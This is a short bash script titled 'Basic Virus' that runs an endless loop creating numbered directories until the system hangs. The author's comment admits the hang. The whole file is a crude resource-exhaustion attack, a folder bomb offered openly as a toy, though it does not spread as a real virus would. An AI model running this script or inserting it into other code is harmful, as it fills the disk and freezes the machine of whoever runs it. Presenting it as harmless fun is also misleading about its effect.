#
# @author: M Rumman
# Program: Basic Virus
# Desc: Code will make infinite folders
# 
# NOTE: Donot run this code for too long, your system will hang
# 

count=0
while [ true ]  #infinite loop initailisation
do
`mkdir $count`  #make a directory with index number as name
((count++)) #increment the index number
done
